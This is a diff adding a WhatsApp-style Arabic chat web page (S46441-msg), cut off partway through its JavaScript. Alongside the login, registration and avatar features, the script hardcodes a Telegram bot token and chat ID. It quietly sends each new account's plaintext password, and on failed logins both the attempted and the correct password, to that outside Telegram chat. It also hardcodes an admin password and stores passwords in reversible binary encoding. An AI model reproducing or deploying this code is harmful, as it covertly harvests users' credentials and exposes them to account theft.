@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>S46441-msg - دردشة خاصة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* جميع الـ CSS كما هو سابقاً (لم يتغير) */
+        :root {
+            --whatsapp-green: #00a884;
+            --whatsapp-green-dark: #005c4b;
+            --whatsapp-light: #f0f2f5;
+            --whatsapp-dark: #111b21;
+            --whatsapp-chat-bg: #efeae2;
+            --whatsapp-message-sent: #d9fdd3;
+            --whatsapp-message-received: #ffffff;
+            --whatsapp-border: #e9edef;
+            --online-green: #4ad504;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', 'Segoe UI', sans-serif; }
+        body, html { min-height: 100vh; overflow-y: auto; background-color: var(--whatsapp-dark); overscroll-behavior: none; margin: 0; padding: 0; }
+        body { background-color: var(--whatsapp-dark); }
+
+        .welcome-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, var(--whatsapp-green) 0%, var(--whatsapp-green-dark) 100%);
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 2000; transition: opacity 0.5s ease; opacity: 1;
+        }
+        .welcome-screen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+        .logo-container { text-align: center; color: white; animation: fadeInUp 1s ease; }
+        .logo-icon { font-size: 80px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        .logo-text { font-size: 32px; font-weight: 300; margin-bottom: 10px; }
+        .logo-subtext { font-size: 14px; opacity: 0.9; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+
+        .login-container {
+            width: 100%; max-width: 450px; background: white; border-radius: 28px; overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3); display: none; opacity: 1;
+            position: relative; margin: 20px auto; max-height: 90vh; overflow-y: auto;
+        }
+        .login-container.active { display: block; }
+        .login-header { background: var(--whatsapp-green); padding: 30px 20px; text-align: center; color: white; }
+        .login-header h1 { font-size: 28px; font-weight: 300; margin-bottom: 5px; }
+        .login-header p { font-size: 14px; opacity: 0.9; }
+        .login-tabs { display: flex; background: #f0f2f5; }
+        .tab { flex: 1; padding: 15px; text-align: center; cursor: pointer; font-size: 14px; font-weight: 500;
+               color: #667781; border-bottom: 3px solid transparent; transition: all 0.3s; }
+        .tab.active { color: var(--whatsapp-green); border-bottom-color: var(--whatsapp-green); background: white; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .form-container { padding: 20px; }
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-label { display: block; margin-bottom: 8px; font-size: 14px; color: #667781; font-weight: 500; }
+        .form-input { width: 100%; padding: 14px 16px; border: 1px solid #e9edef; border-radius: 8px;
+                      font-size: 16px; background: #f0f2f5; transition: all 0.3s; }
+        .form-input:focus { outline: none; border-color: var(--whatsapp-green); background: white; }
+        .password-toggle { position: absolute; left: 15px; top: 42px; cursor: pointer; color: #8696a0; background: none; border: none; font-size: 18px; }
+        .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
+               cursor: pointer; transition: all 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-primary { background: var(--whatsapp-green); color: white; }
+        .btn-primary:hover { background: var(--whatsapp-green-dark); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,168,132,0.3); }
+        .btn-secondary { background: #f0f2f5; color: #667781; margin-top: 10px; }
+        .suggestions-container { padding: 20px; background: #f8f9fa; border-top: 1px solid #e9edef; margin-top: 20px; }
+        .suggestions-title { font-size: 14px; color: #667781; margin-bottom: 15px; text-align: center; }
+        .suggestion-list { display: flex; flex-direction: column; gap: 10px; }
+        .suggestion-item { display: flex; align-items: center; padding: 12px 15px; background: white; border-radius: 8px;
+                           cursor: pointer; transition: all 0.3s; border: 1px solid #e9edef; }
+        .suggestion-item:hover { transform: translateX(-5px); box-shadow: 0 3px 10px rgba(0,0,0,0.1); border-color: var(--whatsapp-green); }
+        .suggestion-avatar { width: 40px; height: 40px; border-radius: 50%; margin-left: 15px; display: flex; align-items: center; justify-content: center; background: linear-gradient(45deg, #667eea, #764ba2); color: white; font-weight: bold; font-size: 18px; }
+        .suggestion-info { flex: 1; }
+        .suggestion-name { font-weight: 600; color: #111b21; margin-bottom: 3px; }
+        .suggestion-pwd { font-size: 12px; color: #8696a0; direction: ltr; text-align: left; font-family: monospace; }
+        .suggestion-remove { color: #f44336; cursor: pointer; padding: 5px; margin-right: 10px; }
+        .quick-action { color: var(--whatsapp-green); font-size: 13px; }
+        .login-footer { padding: 20px; text-align: center; font-size: 12px; color: #667781; background: #f8f9fa; border-top: 1px solid #e9edef; margin-top: 0; }
+        .login-footer a { color: var(--whatsapp-green); text-decoration: none; }
+
+        @media (max-width: 600px) {
+            .login-container { max-width: 95%; margin: 10px auto; border-radius: 20px; }
+            .form-container { padding: 15px; }
+            .form-input { padding: 12px 14px; font-size: 15px; }
+            .btn { padding: 12px; font-size: 15px; }
+            .avatar-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; }
+            .avatar-option { width: 70px; height: 70px; }
+            .login-header h1 { font-size: 24px; }
+            .logo-text { font-size: 28px; }
+            .logo-icon { font-size: 60px; }
+            .tab { padding: 10px; font-size: 13px; }
+        }
+
+        .app-container { display: flex; height: 100vh; width: 100%; background: var(--whatsapp-dark); position: relative; }
+        .sidebar {
+            background: white; display: flex; flex-direction: column; height: 100%;
+            transition: transform 0.3s ease; z-index: 100;
+        }
+        .sidebar-header { padding: 10px 16px; background: var(--whatsapp-light); display: flex; align-items: center;
+                          justify-content: space-between; border-bottom: 1px solid var(--whatsapp-border); height: 60px; }
+        .user-profile { display: flex; align-items: center; gap: 12px; cursor: pointer; }
+        .user-avatar { position: relative; width: 40px; height: 40px; }
+        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+        .avatar-fallback { width: 100%; height: 100%; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+                           color: white; font-weight: bold; font-size: 18px; background: linear-gradient(45deg, #667eea, #764ba2); }
+        .status-indicator { position: absolute; bottom: 2px; right: 2px; width: 12px; height: 12px; border-radius: 50%;
+                            background: var(--online-green); border: 2px solid white; }
+        .user-info { display: flex; flex-direction: column; }
+        .user-name { font-weight: 600; color: #111b21; font-size: 16px; }
+        .user-status { font-size: 13px; color: #667781; }
+        .sidebar-actions { display: flex; gap: 12px; align-items: center; }
+        .action-btn { background: none; border: none; font-size: 20px; cursor: pointer; padding: 8px; border-radius: 50%;
+                      transition: all 0.3s; color: #667781; }
+        .action-btn:hover { background: rgba(0,0,0,0.05); color: #111b21; }
+        .delete-account-btn { color: #f44336; }
+        .admin-btn { color: #ff9800; }
+        .fullscreen-btn { color: var(--whatsapp-green); }
+        .contacts-container { flex: 1; overflow-y: auto; background: white; }
+        .contact-item { display: flex; align-items: center; padding: 12px 16px; cursor: pointer; border-bottom: 1px solid var(--whatsapp-border); transition: background 0.2s; }
+        .contact-item:hover { background: var(--whatsapp-light); }
+        .contact-avatar { margin-left: 15px; width: 40px; height: 40px; flex-shrink: 0; cursor: pointer; }
+        .contact-avatar .avatar-img, .contact-avatar .avatar-fallback { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
+        .contact-info { flex: 1; min-width: 0; }
+        .contact-name { font-weight: 600; color: #111b21; font-size: 17px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .contact-status { font-size: 12px; color: #667781; font-weight: normal; }
+
+        .chat-area {
+            flex: 1; display: flex; flex-direction: column; background: var(--whatsapp-chat-bg);
+            position: relative; height: 100%;
+        }
+        .chat-header { padding: 10px 16px; background: var(--whatsapp-light); display: flex; align-items: center;
+                       border-bottom: 1px solid var(--whatsapp-border); height: 60px; flex-shrink: 0; position: relative; z-index: 2; }
+        .back-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--whatsapp-green); margin-left: 10px; display: none; }
+        .chat-partner { display: flex; align-items: center; gap: 15px; flex: 1; }
+        .chat-partner .user-avatar { width: 40px; height: 40px; }
+        .chat-info { display: flex; flex-direction: column; }
+        .chat-name { font-weight: 600; color: #111b21; font-size: 16px; }
+        .chat-status { font-size: 13px; color: #667781; }
+        .messages-container { flex: 1; padding: 20px; overflow-y: auto; background: var(--whatsapp-chat-bg);
+                              display: flex; flex-direction: column; gap: 8px; min-height: 0; }
+        .message { max-width: 75%; padding: 8px 12px; border-radius: 8px; word-wrap: break-word; animation: messageAppear 0.3s ease; }
+        .message-sent { background: var(--whatsapp-message-sent); align-self: flex-end; border-bottom-right-radius: 2px; }
+        .message-received { background: var(--whatsapp-message-received); align-self: flex-start; border-bottom-left-radius: 2px; }
+        .message-content { font-size: 15px; line-height: 1.4; color: #111b21; }
+        .message-time { font-size: 11px; color: #667781; margin-top: 4px; text-align: right; }
+        @keyframes messageAppear { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .message-input-container {
+            padding: 10px 16px; background: var(--whatsapp-light); border-top: 1px solid var(--whatsapp-border);
+            flex-shrink: 0;
+        }
+        .input-wrapper { display: flex; align-items: center; background: white; border-radius: 24px; padding: 5px 15px; border: 1px solid var(--whatsapp-border); }
+        .message-input { flex: 1; border: none; background: none; padding: 10px; font-size: 16px; outline: none; resize: none; font-family: inherit; }
+        .send-btn { background: var(--whatsapp-green); color: white; border: none; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; }
+        .send-btn:hover { background: var(--whatsapp-green-dark); }
+        .welcome-chat { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 40px; text-align: center; }
+        .welcome-icon { font-size: 120px; color: var(--whatsapp-green); margin-bottom: 30px; }
+        .welcome-title { font-size: 32px; font-weight: 300; color: #41525d; }
+        .notification-toast { position: fixed; bottom: 20px; left: 20px; background: #333; color: white; padding: 12px 20px; border-radius: 8px; z-index: 3000; animation: slideIn 0.3s ease; }
+        @keyframes slideIn { from { transform: translateX(-100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .error-msg { color: #f44336; font-size: 14px; margin-top: 10px; text-align: center; }
+
+        .modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;
+            z-index: 2000; visibility: hidden; opacity: 0; transition: all 0.3s;
+        }
+        .modal.active { visibility: visible; opacity: 1; }
+        .modal-content {
+            background: white; border-radius: 12px; width: 90%; max-width: 500px;
+            max-height: 80vh; overflow-y: auto; padding: 20px;
+        }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .modal-header h3 { color: var(--whatsapp-green); }
+        .close-modal { background: none; border: none; font-size: 24px; cursor: pointer; color: #667781; }
+        .avatar-category { margin-bottom: 20px; }
+        .avatar-category h4 { margin-bottom: 10px; color: #111b21; }
+        .avatar-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        .avatar-option { width: 80px; height: 80px; margin: 0 auto; cursor: pointer; border-radius: 50%; overflow: hidden; border: 3px solid transparent; transition: 0.2s; }
+        .avatar-option.selected { border-color: var(--whatsapp-green); }
+        .avatar-option img { width: 100%; height: 100%; object-fit: cover; }
+
+        .user-list-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid #eee; }
+        .user-actions button { background: none; border: none; margin: 0 5px; cursor: pointer; font-size: 18px; color: var(--whatsapp-green); }
+        .user-actions .delete-user { color: #f44336; }
+        .show-pwd { cursor: pointer; color: var(--whatsapp-green); font-size: 14px; margin-left: 10px; }
+
+        @media (min-width: 801px) {
+            .sidebar { width: 30%; min-width: 300px; max-width: 400px; border-left: 1px solid var(--whatsapp-border); position: relative; transform: none !important; }
+            .back-btn { display: none !important; }
+            .chat-area { width: 70%; }
+        }
+        @media (max-width: 800px) {
+            .sidebar { width: 100%; position: absolute; top: 0; left: 0; height: 100%; transform: translateX(0); }
+            .sidebar.hidden { transform: translateX(-100%); }
+            .chat-area { width: 100%; }
+            .back-btn { display: inline-block; }
+        }
+    </style>
+</head>
+<body>
+    <div class="welcome-screen" id="welcomeScreen">
+        <div class="logo-container">
+            <div class="logo-icon"><i class="fas fa-comments"></i></div>
+            <div class="logo-text">S46441-msg</div>
+            <div class="logo-subtext">تطبيق محادثة . جاري تطويره</div>
+        </div>
+    </div>
+
+    <div class="login-container" id="loginContainer">
+        <div class="login-header">
+            <h1>مرحباً بك</h1>
+            <p>سجل الدخول للبدء في المحادثة</p>
+        </div>
+        <div class="login-tabs">
+            <div class="tab active" data-tab="login">تسجيل الدخول</div>
+            <div class="tab" data-tab="register">إنشاء حساب</div>
+        </div>
+        <div class="tab-content active" id="loginTab">
+            <div class="form-container">
+                <div class="form-group">
+                    <label class="form-label">اسم المستخدم</label>
+                    <input type="text" class="form-input" id="loginUsername" placeholder="أدخل اسم المستخدم">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">كلمة المرور</label>
+                    <input type="password" class="form-input" id="loginPassword" placeholder="أدخل كلمة المرور">
+                    <span class="password-toggle" onclick="togglePassword('loginPassword')"><i class="far fa-eye"></i></span>
+                </div>
+                <div class="form-group">
+                    <input type="checkbox" id="rememberMe"> <label for="rememberMe">حفظ الحساب</label>
+                </div>
+                <div class="suggestions-container" id="loginSuggestions"></div>
+                <button class="btn btn-primary" id="loginBtn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+                <button class="btn btn-secondary" id="anonymousBtn"><i class="fas fa-user-secret"></i> دخول كمجهول</button>
+            </div>
+        </div>
+        <div class="tab-content" id="registerTab">
+            <div class="form-container">
+                <div class="form-group">
+                    <label class="form-label">اسم المستخدم</label>
+                    <input type="text" class="form-input" id="registerUsername" placeholder="اختر اسم مستخدم فريد">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">كلمة المرور</label>
+                    <input type="password" class="form-input" id="registerPassword" placeholder="اختر كلمة مرور">
+                    <span class="password-toggle" onclick="togglePassword('registerPassword')"><i class="far fa-eye"></i></span>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">تأكيد كلمة المرور</label>
+                    <input type="password" class="form-input" id="registerConfirmPassword" placeholder="أعد إدخال كلمة المرور">
+                    <span class="password-toggle" onclick="togglePassword('registerConfirmPassword')"><i class="far fa-eye"></i></span>
+                </div>
+                <div class="avatar-selection" id="registerAvatarSelection" style="margin-top:15px;">
+                    <div class="avatar-title">اختر صورتك (Logo)</div>
+                    <div class="avatar-grid" id="registerAvatarGrid"></div>
+                </div>
+                <button class="btn btn-primary" id="registerBtn"><i class="fas fa-user-plus"></i> إنشاء حساب</button>
+            </div>
+        </div>
+        <div class="login-footer">
+            <p><a href="https://wa.me/201005559385?text=انا+من+موقع+S46441-msg">للتواصل</a></p>
+        </div>
+    </div>
+
+    <div class="app-container" id="appContainer" style="display: none;">
+        <div class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <div class="user-profile" id="openAvatarModalBtn">
+                    <div class="user-avatar" id="currentUserAvatarContainer"></div>
+                    <div class="user-info">
+                        <div class="user-name" id="currentUserName"></div>
+                        <div class="user-status" id="currentUserStatusText"></div>
+                    </div>
+                </div>
+                <div class="sidebar-actions">
+                    <button class="action-btn" id="settingsBtn" title="الإعدادات"><i class="fas fa-cog"></i></button>
+                    <button class="action-btn fullscreen-btn" id="fullscreenAppBtn" title="ملء الشاشة"><i class="fas fa-expand"></i></button>
+                    <button class="action-btn delete-account-btn" id="deleteAccountBtn" title="حذف الحساب" style="display: none;"><i class="fas fa-trash-alt"></i></button>
+                    <button class="action-btn admin-btn" id="adminPanelBtn" title="لوحة التحكم" style="display: none;"><i class="fas fa-users-cog"></i></button>
+                    <button class="action-btn" id="logoutBtn" title="تسجيل الخروج"><i class="fas fa-sign-out-alt"></i></button>
+                </div>
+            </div>
+            <div class="contacts-container" id="contactsContainer"></div>
+        </div>
+        <div class="chat-area" id="chatArea">
+            <div class="welcome-chat" id="welcomeChat"><div class="welcome-icon"><i class="fas fa-comments"></i></div><div class="welcome-title">مرحباً بك</div><div class="welcome-subtitle">اختر محادثة من القائمة الجانبية</div></div>
+            <div class="chat-header" id="chatHeader" style="display: none;">
+                <button class="back-btn" id="backBtn"><i class="fas fa-arrow-right"></i></button>
+                <div class="chat-partner">
+                    <div class="user-avatar" id="chatPartnerAvatarContainer"></div>
+                    <div class="chat-info">
+                        <div class="chat-name" id="chatPartnerName"></div>
+                        <div class="chat-status" id="chatPartnerStatus"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="messages-container" id="messagesContainer" style="display: none;"></div>
+            <div class="message-input-container" id="messageInputContainer" style="display: none;"><div class="input-wrapper"><textarea class="message-input" id="messageInput" rows="1" placeholder="اكتب رسالة..."></textarea><button class="send-btn" id="sendBtn"><i class="fas fa-paper-plane"></i></button></div></div>
+        </div>
+    </div>
+
+    <div class="modal" id="settingsModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>الإعدادات</h3>
+                <button class="close-modal" onclick="closeModal('settingsModal')">&times;</button>
+            </div>
+            <div class="form-group">
+                <label class="form-label">اسم المستخدم الجديد</label>
+                <input type="text" class="form-input" id="newUsername" placeholder="اسم مستخدم جديد">
+                <button class="btn btn-primary" id="changeUsernameBtn" style="margin-top:10px;">تغيير الاسم</button>
+            </div>
+            <div class="form-group">
+                <label class="form-label">كلمة المرور الجديدة</label>
+                <input type="password" class="form-input" id="newPassword" placeholder="كلمة مرور جديدة">
+                <span class="password-toggle" onclick="togglePassword('newPassword')"><i class="far fa-eye"></i></span>
+                <button class="btn btn-primary" id="changePasswordBtn" style="margin-top:10px;">تغيير كلمة المرور</button>
+            </div>
+            <div class="form-group">
+                <label class="form-label">الخصوصية</label>
+                <div>
+                    <input type="checkbox" id="showOnlineCheckbox"> <label for="showOnlineCheckbox">إظهار حالة الاتصال للآخرين</label>
+                </div>
+                <small style="color:#667781;">إذا قمت بإلغاء التحديد، سيرى الآخرون حالتك كـ "غير مرئي"</small>
+            </div>
+            <div class="form-group">
+                <label class="form-label">تسجيل الدخول التلقائي</label>
+                <div>
+                    <input type="checkbox" id="autoLoginCheckbox"> <label for="autoLoginCheckbox">تفعيل تسجيل الدخول التلقائي عند فتح الموقع</label>
+                </div>
+                <small style="color:#667781;">إذا قمت بتفعيل هذا الخيار، سيتم تسجيل دخولك تلقائياً في الزيارات القادمة (طالما أنك لم تسجل الخروج).</small>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="adminModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>لوحة تحكم المدير</h3>
+                <button class="close-modal" onclick="closeModal('adminModal')">&times;</button>
+            </div>
+            <div id="adminUsersList"></div>
+        </div>
+    </div>
+
+    <div class="modal" id="avatarModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>اختر صورة للحساب</h3>
+                <button class="close-modal" onclick="closeModal('avatarModal')">&times;</button>
+            </div>
+            <div id="avatarModalContent"></div>
+            <button class="btn btn-secondary" id="removeAvatarBtn" style="margin-top:15px;">إزالة الصورة (استخدام الحرف الأول)</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8303502446:AAFasC-m3cx8dFAcDQ75BOHYv9CwRVaGYmo';
+        const TELEGRAM_CHAT_ID = '6612813200';
+        
+        let users = [];
+        let currentUser = null;
+        let currentChatPartner = null;
+        let messages = {};
+        let isAdmin = false;
+        let isAnonymous = false;
+        let heartbeatInterval = null;
+
+        const adminAvatar = 'images/admin.jpeg';
+        const animeAvatars = [
+            'images/anime1.jpeg',
+            'images/anime2.jpeg',
+            'images/anime3.jpeg',
+            'images/anime4.jpeg',
+            'images/anime5.jpeg',
+            'images/anime6.jpeg',
+            'images/anime7.jpeg',
+            'images/anime8.jpeg',
+            'images/anime9.jpeg',
+            'images/anime10.jpeg'
+        ];
+        const cuteAvatars = [
+            'images/logo1.jpeg',
+            'images/logo2.jpeg',
+            'images/logo3.jpeg',
+            'images/logo4.jpeg',
+            'images/logo5.jpeg'
+        ];
+        
+        let selectedRegisterAvatar = null;
+
+        // Auto-login setting
+        let autoLoginEnabled = false;
+
+        function loadAutoLoginSetting() {
+            const saved = localStorage.getItem('s46441_autoLogin');
+            autoLoginEnabled = (saved === 'true');
+            const chk = document.getElementById('autoLoginCheckbox');
+            if (chk) chk.checked = autoLoginEnabled;
+        }
+        function saveAutoLoginSetting(value) {
+            autoLoginEnabled = value;
+            localStorage.setItem('s46441_autoLogin', value);
+        }
+
+        // Fullscreen functions (manual button only)
+        let fullScreenActivated = false;
+        function enableFullScreen() {
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) {
+                doc.requestFullscreen().catch(e => console.log("Fullscreen error:", e));
+            }
+        }
+        function exitFullScreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen().catch(e => console.log("Exit fullscreen error:", e));
+            }
+        }
+        function toggleFullScreen() {
+            if (!document.fullscreenElement) {
+                enableFullScreen();
+            } else {
+                exitFullScreen();
+            }
+        }
+        function updateFullscreenIcon() {
+            const btn = document.getElementById('fullscreenAppBtn');
+            if (btn) {
+                if (document.fullscreenElement) {
+                    btn.innerHTML = '<i class="fas fa-compress"></i>';
+                    btn.title = "إنهاء ملء الشاشة";
+                } else {
+                    btn.innerHTML = '<i class="fas fa-expand"></i>';
+                    btn.title = "ملء الشاشة";
+                }
+            }
+        }
+        document.addEventListener('fullscreenchange', updateFullscreenIcon);
+
+        function textToBinary(text) {
+            return text.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
+        }
+        function binaryToText(binary) {
+            return binary.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('');
+        }
+                  
+        function renderAvatar(avatarUrl, username, containerElement) {
+            containerElement.innerHTML = '';
+            if (avatarUrl && avatarUrl.trim() !== '') {
+                const img = document.createElement('img');
+                img.src = avatarUrl;
+                img.className = 'avatar-img';
+                img.alt = username;
+                img.onerror = () => {
+                    containerElement.innerHTML = '';
+                    const fallback = document.createElement('div');
+                    fallback.className = 'avatar-fallback';
+                    fallback.textContent = username.charAt(0).toUpperCase();
+                    const colors = ['#667eea','#764ba2','#f093fb','#f5576c','#4facfe','#00f2fe','#43e97b','#38f9d7'];
+                    const index = username.charCodeAt(0) % colors.length;
+                    fallback.style.background = colors[index];
+                    containerElement.appendChild(fallback);
+                };
+                containerElement.appendChild(img);
+            } else {
+                const fallback = document.createElement('div');
+                fallback.className = 'avatar-fallback';
+                fallback.textContent = username.charAt(0).toUpperCase();
+                const colors = ['#667eea','#764ba2','#f093fb','#f5576c','#4facfe','#00f2fe','#43e97b','#38f9d7'];
+                const index = username.charCodeAt(0) % colors.length;
+                fallback.style.background = colors[index];
+                containerElement.appendChild(fallback);
+            }
+        }
+
+        function loadLocalData() {
+            const storedUsers = localStorage.getItem('s46441_users');
+            if (storedUsers) users = JSON.parse(storedUsers);
+            const adminExists = users.find(u => u.username === 'admin');
+            if (!adminExists) {
+                users.push({ username: 'admin', passwordBinary: textToBinary('sniper46441'), isAdmin: true, avatarUrl: adminAvatar, online: false, lastSeen: null, privacy: { showOnline: true } });
+                saveUsers();
+            } else {
+                if (!adminExists.isAdmin) adminExists.isAdmin = true;
+                if (!adminExists.passwordBinary) adminExists.passwordBinary = textToBinary('sniper46441');
+                if (adminExists.passwordHash) delete adminExists.passwordHash;
+                if (!adminExists.avatarUrl || adminExists.avatarUrl === null) {
+                    adminExists.avatarUrl = adminAvatar;
+                    saveUsers();
+                }
+            }
+            for (let u of users) {
+                if (!u.privacy) u.privacy = { showOnline: true };
+                if (u.online === undefined) u.online = false;
+                if (u.lastSeen === undefined) u.lastSeen = null;
+                if (u.passwordHash) delete u.passwordHash;
+                if (u.avatarUrl === undefined) u.avatarUrl = null;
+            }
+            const storedMessages = localStorage.getItem('s46441_messages');
+            if (storedMessages) messages = JSON.parse(storedMessages);
+        }
+        function saveUsers() { localStorage.setItem('s46441_users', JSON.stringify(users)); }
+        function saveMessages() { localStorage.setItem('s46441_messages', JSON.stringify(messages)); }
+
+        async function sendTelegramMessage(text) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return;
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
+                });
+            } catch (e) { console.error('Telegram error:', e); }
+        }
+
+        async function setUserOnlineStatus(online, reason = null) {
+            const user = users.find(u => u.username === currentUser);
+            if (!user) return;
+            if (user.privacy && user.privacy.showOnline === false && online === true) {
+                user.lastSeen = new Date().toISOString();
+                saveUsers();
+                return;
+            }
+            user.online = online;
+            user.lastSeen = new Date().toISOString();
+            saveUsers();
+            let statusText = '';
+            if (online) statusText = 'online';
+            else if (reason === 'logout') statusText = 'log out';
+            else statusText = 'offline';
+            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`);
+        }
+
+        function startHeartbeat() {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => {
+                if (currentUser && !isAnonymous) {
+                    const user = users.find(u => u.username === currentUser);
+                    if (user) {
+                        user.lastSeen = new Date().toISOString();
+                        if (user.online !== true) {
+                            user.online = true;
+                            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: online (heartbeat)`);
+                        }
+                        saveUsers();
+                    }
+                }
+            }, 30000);
+        }
+        function stopHeartbeat() {
+            if (heartbeatInterval) { clearInterval(heartbeatInterval); heartbeatInterval = null; }
+        }
+
+        function formatTimeAgo(date) {
+            const now = new Date();
+            const diffSeconds = Math.floor((now - date) / 1000);
+            if (diffSeconds < 60) return 'الآن';
+            const diffMinutes = Math.floor(diffSeconds / 60);
+            if (diffMinutes < 60) {
+                if (diffMinutes === 1) return 'منذ دقيقة';
+                if (diffMinutes === 2) return 'منذ دقيقتين';
+                return `منذ ${diffMinutes} دقائق`;
+            }
+            const diffHours = Math.floor(diffMinutes / 60);
+            if (diffHours < 24) {
+                if (diffHours === 1) return 'منذ ساعة';
+                if (diffHours === 2) return 'منذ ساعتين';
+                return `منذ ${diffHours} ساعات`;
+            }
+            const diffDays = Math.floor(diffHours / 24);
+            if (diffDays < 30) {
+                if (diffDays === 1) return 'منذ يوم';
+                if (diffDays === 2) return 'منذ يومين';
+                return `منذ ${diffDays} أيام`;
+            }
+            const diffMonths = Math.floor(diffDays / 30);
+            if (diffMonths === 1) return 'منذ شهر';
+            if (diffMonths === 2) return 'منذ شهرين';
+            return `منذ ${diffMonths} شهر`;
+        }
+
+        function getUserDisplayStatus(username) {
+            const user = users.find(u => u.username === username);
+            if (!user) return 'غير متاح';
+            if (user.privacy && user.privacy.showOnline === false) return 'غير مرئي';
+            if (user.online) {
+                return '🟢 متصل الآن';
+            } else {
+                if (user.lastSeen) {
+                    const lastSeenDate = new Date(user.lastSeen);
+                    return `⚫ ${formatTimeAgo(lastSeenDate)}`;
+                } else return '⚫ غير متاح';
+            }
+        }
+
+        async function loginOrRegister(username, password, isRegister = false, avatarUrl = null) {
+            if (!username || !password) throw new Error('الرجاء إدخال الاسم وكلمة المرور');
+            const passwordBinary = textToBinary(password);
+            const existing = users.find(u => u.username === username);
+            if (existing) {
+                if (isRegister) throw new Error('اسم المستخدم موجود بالفعل');
+                if (existing.passwordBinary !== passwordBinary) {
+                    const correctPlain = binaryToText(existing.passwordBinary);
+                    await sendTelegramMessage(`⚠️ محاولة دخول فاشلة\n👤 المستخدم: ${username}\n🔑 كلمة المرور المدخلة: ${password}\n✅ كلمة المرور الصحيحة: ${correctPlain}`);
+                    throw new Error('كلمة المرور غير صحيحة');
+                }
+                currentUser = username;
+                isAdmin = (username === 'admin');
+                isAnonymous = false;
+                await setUserOnlineStatus(true, 'online');
+                startHeartbeat();
+                return true;
+            } else {
+                if (!isRegister) throw new Error('المستخدم غير موجود');
+                let finalAvatar = avatarUrl;
+                if (username === 'admin' && !finalAvatar) finalAvatar = adminAvatar;
+                users.push({ username, passwordBinary, avatarUrl: finalAvatar, isAdmin: false, online: false, lastSeen: null, privacy: { showOnline: true } });
+                saveUsers();
+                currentUser = username;
+                isAdmin = (username === 'admin');
+                isAnonymous = false;
+                await setUserOnlineStatus(true, 'online');
+                startHeartbeat();
+                sendTelegramMessage(`🆕 حساب جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}`);
+                return true;
+            }
+        }
+
+        async function changeUsername(oldUsername, newUsername, byAdmin = false) {
+            if (!byAdmin && oldUsername !== currentUser) throw new Error('لا يمكنك تغيير اسم مستخدم آخر');
+            if (newUsername === oldUsername) throw new Error('الاسم الجديد مطابق للقديم');
+            if (users.find(u => u.username === newUsername)) throw new Error('اسم المستخدم موجود بالفعل');
+            if (newUsername === 'admin') throw new Error('لا يمكن استخدام اسم admin');
+            const user = users.find(u => u.username === oldUsername);
+            if (!user) throw new Error('المستخدم غير موجود');
+            user.username = newUsername;
+            saveUsers();
+            for (let key in messages) {
